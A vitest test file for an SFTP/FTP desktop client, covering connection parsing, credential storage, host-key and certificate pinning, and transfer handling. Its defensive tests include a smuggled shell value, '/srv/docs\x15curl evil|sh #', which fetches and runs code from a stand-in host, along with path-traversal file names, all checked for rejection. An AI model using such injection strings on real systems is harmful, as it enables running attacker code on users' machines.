import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { EventEmitter } from 'node:events'
import { describe, expect, it } from 'vitest'
import { parseListDate } from '../src/main/engine/ftpSession'
import { localChild, opensAsProgram } from '../src/main/engine/localFS'
import { CancelledError, isPermanentError, PermanentError, SessionError, type RemoteSession } from '../src/main/engine/session'
import { isPasswordPrompt, type SFTPSession } from '../src/main/engine/sftpSession'
import { CertificateStore } from '../src/main/store/certificates'
import { fingerprint, KnownHostsStore } from '../src/main/store/knownHosts'
import { ArchiveError, decodeArchive, encodeArchive } from '../src/main/store/siteArchive'
import { QueueStore, SettingsStore } from '../src/main/store/settingsStore'
import { SiteStore, type SecretCipher } from '../src/main/store/siteStore'
import { TLSHostsStore } from '../src/main/store/tlsHosts'
import { Terminals } from '../src/main/terminal'
import { isPlainName, TransferManager, uniqueLocalName } from '../src/main/transfers'
import { displayAddress, effectivePort, makeSite, normalizeSite, parseQuickConnect } from '../src/shared/site'
import { defaultSettings, type AppSettings, type FileEntry, type PromptRequest, type Site, type TransferItem } from '../src/shared/types'
import { compareVersions, hasControlChars, Permissions, RemotePath, shellQuote } from '../src/shared/util'

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'remotessh-test-'))

/** Reversible stand-in for the OS keyring. */
const fakeCipher: SecretCipher = {
  available: () => true,
  encrypt: async (s) => Buffer.from(s).toString('base64').split('').reverse().join(''),
  decrypt: async (s) => Buffer.from(s.split('').reverse().join(''), 'base64').toString(),
}

describe('quickconnect', () => {
  it('parses scheme, credentials, port and path', () => {
    const q = parseQuickConnect('sftp://me:p%40ss@example.com:2222/var/www', '', '', '')
    expect(q.site.serverProtocol).toBe('sftp')
    expect(q.site.user).toBe('me')
    expect(q.password).toBe('p@ss')
    expect(q.site.host).toBe('example.com')
    expect(q.site.port).toBe(2222)
    expect(q.initialPath).toBe('/var/www')
  })
  it('maps ftps to implicit TLS on port 990', () => {
    const q = parseQuickConnect('ftps://files.example.com', 'u', 'p', '')
    expect(q.site.encryption).toBe('requireImplicit')
    expect(effectivePort(q.site)).toBe(990)
  })
  it('uses SFTP for port 22 without a scheme and anonymous FTP without credentials', () => {
    expect(parseQuickConnect('host', 'u', 'p', '22').site.serverProtocol).toBe('sftp')
    expect(parseQuickConnect('host', '', '', '').site.logonType).toBe('anonymous')
  })
  it('handles IPv6 literals and rejects bad input', () => {
    const q = parseQuickConnect('[::1]:2121', 'u', '', '')
    expect(q.site.host).toBe('::1')
    expect(q.site.port).toBe(2121)
    expect(() => parseQuickConnect('  ', '', '', '')).toThrow('hostname')
    expect(() => parseQuickConnect('gopher://x', '', '', '')).toThrow('Invalid protocol')
    expect(() => parseQuickConnect('host', '', '', '70000')).toThrow('Invalid port')
  })
  it('formats addresses', () => {
    expect(displayAddress(makeSite({ host: 'h', user: 'u' }))).toBe('sftp://u@h:22')
  })
})

describe('paths and permissions', () => {
  it('joins and splits remote paths', () => {
    expect(RemotePath.join('/', 'a')).toBe('/a')
    expect(RemotePath.join('/a/', 'b')).toBe('/a/b')
    expect(RemotePath.parent('/a/b/')).toBe('/a')
    expect(RemotePath.parent('/a')).toBe('/')
    expect(RemotePath.normalize('/a/./b/../c//')).toBe('/a/c')
    expect(RemotePath.lastComponent('/a/b')).toBe('b')
  })
  it('converts permissions', () => {
    expect(Permissions.symbolic(0o40755)).toBe('drwxr-xr-x')
    expect(Permissions.bits('-rw-r--r--')).toBe(0o644)
    expect(Permissions.bits('0750')).toBe(0o750)
    expect(Permissions.octal(0o7)).toBe('007')
  })
  it('parses raw LIST dates', () => {
    const now = new Date(Date.UTC(2026, 9, 14, 12))
    expect(parseListDate('Mar 05 2024', now)).toBe(Date.UTC(2024, 2, 5))
    expect(parseListDate('Oct 01 09:30', now)).toBe(Date.UTC(2026, 9, 1, 9, 30))
    expect(parseListDate('Dec 24 18:00', now)).toBe(Date.UTC(2025, 11, 24, 18)) // future → last year
    expect(parseListDate('01-05-24 01:15PM', now)).toBe(Date.UTC(2024, 0, 5, 13, 15))
    expect(parseListDate('01-05-24 12:15AM', now)).toBe(Date.UTC(2024, 0, 5, 0, 15))
    expect(parseListDate('garbage', now)).toBeNull()
  })
})

describe('site archive (.remotessh)', () => {
  it('round-trips sites and passwords with fresh ids', () => {
    const a = makeSite({ name: 'A', host: 'a.example.com' })
    const b = makeSite({ name: 'B', host: 'b.example.com', serverProtocol: 'ftp' })
    const text = encodeArchive([a, b], { [a.id]: 'secret' })
    expect(JSON.parse(text).passwords).toEqual({ [a.id]: 'secret' })
    expect(JSON.parse(text).exportedAt).toMatch(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/)
    const imported = decodeArchive(text)
    expect(imported.sites.map((s) => s.name)).toEqual(['A', 'B'])
    expect(imported.sites[0].id).not.toBe(a.id)
    expect(imported.passwords).toEqual({ [imported.sites[0].id]: 'secret' })
  })
  it('reads files written by the macOS app', () => {
    // Shape produced by Swift's JSONEncoder (sorted keys, ISO 8601 dates, uppercase UUIDs).
    const swift = `{
      "exportedAt" : "2026-10-14T10:00:00Z", "format" : "remotessh.sites", "version" : 1,
      "passwords" : { "0F8E2A51-4C1B-4E8F-9A55-1E2D3C4B5A69" : "pw" },
      "sites" : [ { "comments" : "", "defaultLocalDirectory" : "", "defaultRemoteDirectory" : "/srv",
        "encryption" : "explicitIfAvailable", "folder" : "Work", "host" : "example.com",
        "id" : "0F8E2A51-4C1B-4E8F-9A55-1E2D3C4B5A69", "keyFilePath" : "~/.ssh/id_ed25519",
        "logonType" : "keyFile", "name" : "Example", "port" : 0, "serverProtocol" : "sftp",
        "transferMode" : "passive", "trustInvalidCertificate" : false, "user" : "deploy" } ]
    }`
    const { sites, passwords } = decodeArchive(swift)
    expect(sites[0]).toMatchObject({ name: 'Example', folder: 'Work', logonType: 'keyFile', defaultRemoteDirectory: '/srv' })
    expect(passwords[sites[0].id]).toBe('pw')
  })
  it('rejects foreign and newer files', () => {
    expect(() => decodeArchive('[]')).toThrow(ArchiveError)
    expect(() => decodeArchive('{"format":"other","version":1,"sites":[]}')).toThrow('not a RemoteSSH')
    expect(() => decodeArchive('{"format":"remotessh.sites","version":2,"sites":[]}')).toThrow('newer version')
  })
})

describe('stores', () => {
  it('keeps passwords encrypted and out of sites.json', async () => {
    const dir = tmp()
    const store = new SiteStore(dir, fakeCipher)
    const site = makeSite({ host: 'h' })
    await store.save({ sites: [site], passwords: { [site.id]: 'hunter2' } })
    expect(fs.readFileSync(path.join(dir, 'sites.json'), 'utf8')).not.toContain('hunter2')
    expect(fs.readFileSync(path.join(dir, 'secrets.json'), 'utf8')).not.toContain('hunter2')
    expect(await new SiteStore(dir, fakeCipher).password(site.id)).toBe('hunter2')
    if (process.platform !== 'win32') expect(fs.statSync(path.join(dir, 'secrets.json')).mode & 0o777).toBe(0o600)
    await store.save({ sites: [], passwords: {} })
    expect(await new SiteStore(dir, fakeCipher).password(site.id)).toBeNull()
  })
  it('never writes passwords without OS encryption', async () => {
    const dir = tmp()
    const store = new SiteStore(dir, { ...fakeCipher, available: () => false })
    const site = makeSite({ host: 'h' })
    await store.save({ sites: [site], passwords: { [site.id]: 'hunter2' } })
    expect(fs.existsSync(path.join(dir, 'secrets.json'))).toBe(false)
    expect(store.state().canStorePasswords).toBe(false)
  })
  it('tracks host keys', () => {
    const dir = tmp()
    const hosts = new KnownHostsStore(dir)
    expect(hosts.check('Example.com', 22, 'ssh-ed25519 AAA')).toBe('unknown')
    hosts.trust('Example.com', 22, 'ssh-ed25519 AAA')
    const reloaded = new KnownHostsStore(dir)
    expect(reloaded.check('example.com', 22, 'ssh-ed25519 AAA')).toBe('trusted')
    expect(reloaded.check('example.com', 22, 'ssh-ed25519 BBB')).toBe('changed')
    expect(reloaded.check('example.com', 2222, 'ssh-ed25519 AAA')).toBe('unknown') // ports are kept apart
    // The same value `ssh-keygen -lf` prints for this public key.
    const blob = Buffer.from('AAAAC3NzaC1lZDI1NTE5AAAAIPUbS24Qa1ge84W6FhPjOR3LpXZfNmS6iDXnK3uZ7j2s', 'base64')
    expect(fingerprint(blob)).toBe('SHA256:2TXDMHQhye2muUSbjICrbegLLW0EHBcZ/2tPmOpCoN8')
  })
  it('restores interrupted transfers as queued and drops finished ones', () => {
    const dir = tmp()
    const q = new QueueStore(dir)
    const base: TransferItem = { id: '1', siteID: 's', direction: 'upload', localPath: '/a', remotePath: '/a', size: 1, status: 'transferring', transferred: 0, speed: 5 }
    q.save([base, { ...base, id: '2', status: 'finished' }])
    const loaded = q.load()
    expect(loaded).toHaveLength(1)
    expect(loaded[0]).toMatchObject({ id: '1', status: 'queued' })
    expect(loaded[0].speed).toBeUndefined()
  })
  it('fills in missing settings', () => {
    const dir = tmp()
    fs.writeFileSync(path.join(dir, 'settings.json'), '{"retryCount":5}')
    const s = new SettingsStore(dir)
    expect(s.value.retryCount).toBe(5)
    expect(s.value.maxConcurrentTransfers).toBe(2)
    expect(s.value.theme).toBe('system')
  })
  it('finds a free local name', () => {
    const dir = tmp()
    fs.writeFileSync(path.join(dir, 'a.txt'), '')
    fs.writeFileSync(path.join(dir, 'a (1).txt'), '')
    expect(path.basename(uniqueLocalName(path.join(dir, 'a.txt')))).toBe('a (2).txt')
  })
})

describe('compareVersions', () => {
  it('orders dotted versions numerically and ignores a leading v and suffixes', () => {
    expect(compareVersions('v1.2.10', '1.2.9')).toBe(1)
    expect(compareVersions('1.0.0', 'v1.0.0')).toBe(0)
    expect(compareVersions('1.0', '1.0.1')).toBe(-1)
    expect(compareVersions('2.0.0-beta.1', '1.9.9')).toBe(1)
  })
})

describe('shellQuote', () => {
  it('wraps in single quotes and escapes embedded ones', () => {
    expect(shellQuote('/var/www')).toBe(`'/var/www'`)
    expect(shellQuote(`it's $HOME`)).toBe(`'it'\\''s $HOME'`)
  })
})

describe('local names from server listings', () => {
  it('keeps names inside the target folder', () => {
    expect(localChild('/dl', 'a.txt', path.posix)).toBe('/dl/a.txt')
    expect(localChild('/dl', 'a\\b', path.posix)).toBe('/dl/a\\b') // a valid POSIX name
    for (const bad of ['', '.', '..', '../x', 'a/../../x', '/etc/passwd', 'x\0y']) expect(localChild('/dl', bad, path.posix)).toBeNull()
    for (const bad of ['..\\x', 'a\\b', 'C:x', 'C:\\x']) expect(localChild('C:\\dl', bad, path.win32)).toBeNull()
  })
  it('knows which files would run instead of opening in an editor', () => {
    expect(opensAsProgram('deploy.BAT', 'win32')).toBe(true)
    expect(opensAsProgram('app.js', 'win32')).toBe(true)
    expect(opensAsProgram('app.js', 'darwin')).toBe(false)
    expect(opensAsProgram('run.command', 'darwin')).toBe(true)
    expect(opensAsProgram('x.desktop', 'linux')).toBe(true)
    expect(opensAsProgram('index.html', 'win32')).toBe(false)
  })
})

describe('normalizeSite', () => {
  it('replaces wrongly typed fields with defaults', () => {
    const site = normalizeSite({ id: 'abc', host: null, port: '22', name: 'N', trustInvalidCertificate: 'yes' } as unknown as Partial<Site>)
    expect(site).toMatchObject({ id: 'ABC', host: '', port: 0, name: 'N', trustInvalidCertificate: false })
    expect(normalizeSite(null as unknown as Partial<Site>).host).toBe('')
    expect(Object.keys(normalizeSite({ extra: 1 } as unknown as Partial<Site>))).not.toContain('extra')
  })
})

describe('TransferManager', () => {
  const entry = (name: string): FileEntry => ({ name, isDirectory: false, isLink: false, size: 1, modified: null, permissions: '', owner: '', group: '' })

  /** A session whose downloads wait for `release()` (or the abort signal). */
  function fakeSession(site: Site) {
    let release: () => void = () => undefined
    const session = {
      site,
      secure: true,
      closed: false,
      connect: async () => undefined,
      close: () => void Object.assign(session, { closed: true }),
      pwd: async () => '/',
      list: async () => [],
      stat: async () => ({ size: 1, modified: 0 }),
      download: (_r: string, local: string, _o: number, signal: AbortSignal) =>
        new Promise<void>((resolve, reject) => {
          release = () => {
            fs.writeFileSync(local, 'x')
            resolve()
          }
          signal.addEventListener('abort', () => reject(new CancelledError()), { once: true })
        }),
    } as unknown as RemoteSession
    return { session, release: () => release() }
  }

  function setup(
    opts: {
      connect?: (site: Site) => Promise<RemoteSession>
      answers?: unknown[]
      settings?: Partial<AppSettings>
      list?: (path: string) => Promise<FileEntry[]>
      dir?: string
    } = {},
  ) {
    const dir = opts.dir ?? tmp()
    const site = makeSite({ host: 'h' })
    const fake = fakeSession(site)
    if (opts.list) Object.assign(fake.session, { list: opts.list })
    const errors: string[] = []
    const prompts: PromptRequest[] = []
    let connects = 0
    const manager = new TransferManager(
      {
        settings: () => ({ ...defaultSettings, maxConcurrentTransfers: 1, ...opts.settings }),
        site: () => site,
        connectSession: async (s) => {
          connects++
          return opts.connect ? opts.connect(s) : fake.session
        },
        browseSession: () => fake.session,
        prompter: {
          ask: async (r) => {
            prompts.push(r)
            return opts.answers?.shift() ?? null
          },
        },
        status: () => undefined,
        error: (t) => errors.push(t),
        publish: () => undefined,
        transferFinished: () => undefined,
      },
      new QueueStore(dir),
    )
    return { dir, site, fake, manager, errors, prompts, connects: () => connects }
  }
  const settle = () => new Promise((r) => setTimeout(r, 20))

  it('never writes outside the chosen folder for hostile names', async () => {
    const t = setup()
    const local = path.join(t.dir, 'dl')
    await t.manager.enqueueDownload([entry('../evil'), entry('ok.txt')], '/', local, t.site)
    expect(t.manager.all().map((i) => i.localPath)).toEqual([path.join(local, 'ok.txt')])
    expect(t.errors[0]).toContain('../evil')
  })

  it('removes a running transfer once it has stopped', async () => {
    const t = setup()
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    const [item] = t.manager.all()
    expect(item.status).toBe('transferring')
    t.manager.remove([item.id])
    await settle()
    expect(t.manager.all()).toEqual([])
  })

  it('does not retry a connection the user cancelled', async () => {
    const t = setup({ connect: async () => Promise.reject(new CancelledError('Connection cancelled.')) })
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.connects()).toBe(1)
    expect(t.manager.all()[0]).toMatchObject({ status: 'failed', error: 'Connection cancelled.' })
  })

  it('stop all also interrupts waiting transfers', async () => {
    const t = setup()
    await t.manager.enqueueDownload([entry('a.txt'), entry('b.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.manager.all().map((i) => i.status)).toEqual(['transferring', 'queued'])
    t.manager.stopAll()
    await settle()
    expect(t.manager.all().map((i) => [i.status, i.error])).toEqual([
      ['failed', 'Interrupted by user'],
      ['failed', 'Interrupted by user'],
    ])
  })

  it('"Rename" with the suggested (existing) name never overwrites the target', async () => {
    const t = setup({ answers: [{ action: 'rename', applyToAll: false, newName: 'a.txt' }] })
    fs.writeFileSync(path.join(t.dir, 'a.txt'), 'old')
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    t.fake.release()
    await settle()
    const [item] = t.manager.all()
    expect(item.localPath).toBe(path.join(t.dir, 'a (1).txt'))
    expect(item.status).toBe('finished')
    expect(fs.readFileSync(path.join(t.dir, 'a.txt'), 'utf8')).toBe('old')
    expect(fs.readFileSync(path.join(t.dir, 'a (1).txt'), 'utf8')).toBe('x')
  })

  it('forgets "apply to all" once the batch is done', async () => {
    const t = setup({ answers: [{ action: 'skip', applyToAll: true }, { action: 'skip', applyToAll: false }] })
    fs.writeFileSync(path.join(t.dir, 'a.txt'), 'old')
    fs.writeFileSync(path.join(t.dir, 'b.txt'), 'old')
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.prompts).toHaveLength(1)
    await t.manager.enqueueDownload([entry('b.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.prompts).toHaveLength(2) // a later batch is asked again
  })

  it('does not follow links to folders in a remote folder download', async () => {
    const dirEntry = (name: string, isLink = false): FileEntry => ({ ...entry(name), isDirectory: true, isLink, size: null })
    const listed: string[] = []
    const t = setup({
      list: async (p) => {
        listed.push(p)
        return p === '/top' ? [dirEntry('loop', true), entry('a.txt')] : []
      },
    })
    await t.manager.enqueueDownload([dirEntry('top')], '/', t.dir, t.site)
    expect(listed).toEqual(['/top'])
    expect(t.manager.all().map((i) => i.remotePath)).toEqual(['/top/a.txt'])
  })

  it('does not retry errors a retry cannot fix', async () => {
    const t = setup({ connect: async () => Promise.reject(new PermanentError('530 Login incorrect.')) })
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.connects()).toBe(1)
    expect(t.manager.all()[0]).toMatchObject({ status: 'failed', error: '530 Login incorrect.' })
  })

  it('waits before retrying a connection failure', async () => {
    const t = setup({ connect: async () => Promise.reject(new SessionError('ECONNRESET')), settings: { retryCount: 2 } })
    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.connects()).toBe(1) // the retry waits about a second instead of reconnecting at once
    expect(t.manager.all()[0].status).toBe('queued')
    t.manager.stopAll()
  })

  it('"apply to all" also answers questions already waiting from other workers', async () => {
    const t = setup({ answers: [{ action: 'skip', applyToAll: true }], settings: { maxConcurrentTransfers: 2 } })
    fs.writeFileSync(path.join(t.dir, 'a.txt'), 'old')
    fs.writeFileSync(path.join(t.dir, 'b.txt'), 'old')
    await t.manager.enqueueDownload([entry('a.txt'), entry('b.txt')], '/', t.dir, t.site)
    await settle()
    expect(t.prompts).toHaveLength(1)
    expect(t.manager.all().map((i) => [i.status, i.error])).toEqual([
      ['finished', 'Skipped'],
      ['finished', 'Skipped'],
    ])
  })

  it('restores unfinished transfers as failed, ready to retry', () => {
    const dir = tmp()
    new QueueStore(dir).save([
      { id: 'A', siteID: 'S', direction: 'download', localPath: '/l', remotePath: '/r', size: 1, status: 'queued', transferred: 0 },
    ])
    const t = setup({ dir })
    expect(t.manager.processing).toBe(true)
    expect(t.manager.all()[0]).toMatchObject({ status: 'failed', error: 'Interrupted when RemoteSSH quit' })
  })
})

describe('review fixes', () => {
  it('spots control characters that could rewrite a typed shell command', () => {
    expect(hasControlChars('/var/www/site')).toBe(false)
    expect(hasControlChars("/srv/it's ü")).toBe(false)
    expect(hasControlChars('/srv/docs\x15curl evil|sh #')).toBe(true)
    expect(hasControlChars('/srv/a\x03')).toBe(true)
    expect(hasControlChars('/srv/a\x7f')).toBe(true)
    expect(hasControlChars('/srv/a\u009b')).toBe(true)
    expect(hasControlChars('/srv/a\nb')).toBe(true)
  })

  it('accepts only plain names as rename answers', () => {
    expect(isPlainName('report.txt')).toBe(true)
    for (const bad of ['', '.', '..', '../x', 'a/b', 'a\\b', 'a\nb']) expect(isPlainName(bad)).toBe(false)
  })

  it('keeps folders openable in a recursive chmod', () => {
    expect(Permissions.folderMode(0o644).toString(8)).toBe('755')
    expect(Permissions.folderMode(0o600).toString(8)).toBe('700')
    expect(Permissions.folderMode(0o640).toString(8)).toBe('750')
    expect(Permissions.folderMode(0o000).toString(8)).toBe('0')
  })

  it('gives the saved password only to real password prompts', () => {
    for (const p of ['Password:', 'password: ', "deploy@example.com's password:", 'Password']) expect(isPasswordPrompt(p)).toBe(true)
    for (const p of ['One-time password:', 'Verification code (not your password):', 'OTP:', 'New password:']) expect(isPasswordPrompt(p)).toBe(false)
  })

  it('tells permanent errors from connection problems', () => {
    expect(isPermanentError(new PermanentError('550'))).toBe(true)
    expect(isPermanentError(Object.assign(new Error('denied'), { code: 'EACCES' }))).toBe(true)
    expect(isPermanentError(Object.assign(new Error('Permission denied'), { code: 3 }))).toBe(true) // SFTP status
    expect(isPermanentError(Object.assign(new Error('reset'), { code: 'ECONNRESET' }))).toBe(false)
    expect(isPermanentError(new SessionError('Connection closed.'))).toBe(false)
  })

  it('validates enum values in sites and imports', () => {
    const site = normalizeSite({ serverProtocol: 'gopher', encryption: 'none', logonType: 'root', port: -5 } as unknown as Partial<Site>)
    expect(site).toMatchObject({ serverProtocol: 'sftp', encryption: 'explicitIfAvailable', logonType: 'normal', port: 0 })
    const file = (fields: object) => JSON.stringify({ format: 'remotessh.sites', version: 1, sites: [{ ...makeSite({ name: 'Prod' }), ...fields }] })
    expect(() => decodeArchive(file({ serverProtocol: 'SFTP' }))).toThrow(/Prod has an invalid serverProtocol/)
    expect(() => decodeArchive(file({ encryption: 'requireimplicit' }))).toThrow(ArchiveError)
    expect(decodeArchive(file({ trustInvalidCertificate: true })).sites[0].trustInvalidCertificate).toBe(false)
  })

  it('pins accepted certificates by fingerprint', () => {
    const dir = tmp()
    const certs = new CertificateStore(dir)
    expect(certs.check('Host', 990, 'AA', true)).toBe('unknown')
    certs.trust('host', 990, 'AA', false) // accept once: this run only
    expect(certs.check('HOST', 990, 'AA', false)).toBe('trusted')
    expect(certs.check('host', 990, 'BB', false)).toBe('changed')
    expect(new CertificateStore(dir).check('host', 990, 'AA', true)).toBe('unknown')
    certs.trust('host', 990, 'AA', true)
    const reloaded = new CertificateStore(dir)
    expect(reloaded.hasPin('host', 990)).toBe(true)
    expect(reloaded.check('host', 990, 'AA', true)).toBe('trusted')
    expect(reloaded.check('host', 990, 'BB', true)).toBe('changed')
    expect(reloaded.check('host', 990, 'AA', false)).toBe('unknown') // the site's trust setting is off
    expect(reloaded.check('host', 21, 'AA', true)).toBe('unknown')
  })

  it('remembers FTP servers that used TLS across restarts', () => {
    const dir = tmp()
    new TLSHostsStore(dir).add('FTP.example.com', 21)
    const store = new TLSHostsStore(dir)
    expect(store.has('ftp.example.com', 21)).toBe(true)
    expect(store.has('ftp.example.com', 2121)).toBe(false)
  })

  it('refuses to type a folder with control characters into a new shell', async () => {
    const written: string[] = []
    const errors: string[] = []
    const channel = Object.assign(new EventEmitter(), {
      stderr: Object.assign(new EventEmitter(), { setEncoding: () => undefined }),
      setEncoding: () => undefined,
      write: (d: string) => written.push(d),
      pause: () => undefined,
      resume: () => undefined,
    })
    const session = { pwd: async () => '/home/u', shell: async () => channel, close: () => undefined } as unknown as SFTPSession
    const terminals = new Terminals({ connect: async () => session, send: () => undefined, error: (t) => errors.push(t) })
    await terminals.open(makeSite(), 80, 24, '/srv/docs\x15curl evil|sh #')
    expect(written).toEqual([])
    expect(errors[0]).toMatch(/control characters/)
    await terminals.open(makeSite(), 80, 24, "/srv/it's")
    expect(written).toEqual([` cd -- '/srv/it'\\''s' && clear\n`])
  })

  it('pauses the SSH channel while the terminal is behind', async () => {
    const calls: string[] = []
    const channel = Object.assign(new EventEmitter(), {
      stderr: Object.assign(new EventEmitter(), { setEncoding: () => undefined }),
      setEncoding: () => undefined,
      write: () => true,
      close: () => undefined,
      pause: () => calls.push('pause'),
      resume: () => calls.push('resume'),
    })
    const session = { pwd: async () => '/', shell: async () => channel, close: () => undefined } as unknown as SFTPSession
    const terminals = new Terminals({ connect: async () => session, send: () => undefined, error: () => undefined })
    const id = await terminals.open(makeSite(), 80, 24, null)
    channel.emit('data', 'x'.repeat(1_200_000))
    expect(calls).toEqual(['pause'])
    terminals.ack(id, 1_100_000)
    expect(calls).toEqual(['pause', 'resume'])
    terminals.closeAll()
  })
})
